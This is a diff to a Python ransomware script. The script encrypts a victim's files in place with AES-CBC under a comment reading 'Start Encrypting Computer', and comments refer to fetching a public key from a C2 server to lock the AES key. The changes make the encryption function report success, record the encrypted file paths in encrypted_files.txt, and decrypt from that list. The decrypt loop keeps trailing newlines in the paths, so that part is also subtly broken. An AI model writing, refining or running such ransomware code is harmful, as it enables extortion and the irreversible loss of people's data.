@@ -21,7 +21,7 @@ def encrypt_file(file_path, out_file_path, key):
         with open(file_path, 'rb') as infile:
             in_data = infile.read()
     except Exception as e:
-        return
+        return False
 
     initial_vector = get_random_bytes(AES.block_size)
     encryptor = AES.new(key, AES.MODE_CBC, initial_vector)
@@ -33,8 +33,10 @@ def encrypt_file(file_path, out_file_path, key):
     try:
         with open(out_file_path, 'wb') as outfile:
             outfile.write(initial_vector+out_data)
+            return True
+
     except Exception as e:
-        return
+        return False
 
 def decrypt_file(file_path, out_file_path, key):
     try:
@@ -102,9 +104,17 @@ else:
 
     # Start Encrypting Computer
     load_file_paths()
+    encrypted_files = ""
     for path in file_paths:
         print(path)
-        encrypt_file(path, path, key)
+        r = encrypt_file(path, path, key)
+        if r:
+            encrypted_files += path + '\n'
+
+    with open("./encrypted_files.txt", 'w') as encfiles:
+            encfiles.write(encrypted_files)
+
+
 
     # Encrypt AES Key And Store In File
     # Get Public Key From C2 Server
@@ -167,7 +177,7 @@ decrypted_aes = priv_key.decrypt(
             )
         )
 
-load_file_paths()
-for dec_path in file_paths:
-    decrypt_file(dec_path, dec_path, decrypted_aes)
+with open('./encrypted_files.txt', 'r') as files:
+    for line in files:
+        decrypt_file(line, line, decrypted_aes)
 
